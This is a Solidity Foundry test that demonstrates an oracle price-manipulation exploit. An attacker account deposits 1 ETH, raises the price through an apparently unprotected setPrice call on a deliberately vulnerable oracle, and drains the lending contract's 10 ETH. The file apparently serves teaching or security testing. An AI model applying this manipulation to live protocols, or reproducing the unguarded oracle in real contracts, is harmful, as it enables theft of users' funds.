// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VulnerablePriceOracle} from "../src/VulnerablePriceOracle.sol";
import {VulnerableLending} from "../src/VulnerableLending.sol";

contract VulnerableLendingTest is Test {
    VulnerablePriceOracle public oracle;
    VulnerableLending public lending;

    address attacker = makeAddr("attacker");

    function setUp() public {
        oracle = new VulnerablePriceOracle(100 ether);
        lending = new VulnerableLending(address(oracle));

        vm.deal(attacker, 1 ether);

        // Give the lending protocol enough ETH to pay borrowers.
        vm.deal(address(lending), 10 ether);
    }

    function test_AttackerCanManipulateOracleAndOverborrow() public {
        // Attacker deposits 1 ETH as collateral.
        vm.startPrank(attacker);

        lending.depositCollateral{value: 1 ether}();

        // At this point:
        // 1 ETH × $100 = $100 collateral value.

        // Attacker manipulates the vulnerable oracle.
        oracle.setPrice(1000 ether);

        // Lending protocol now believes:
        // 1 ETH × $1000 = $1000 collateral value.

        lending.borrow(10 ether);

        vm.stopPrank();

        assertEq(lending.debt(attacker), 10 ether);
        assertEq(attacker.balance, 10 ether);
    }
}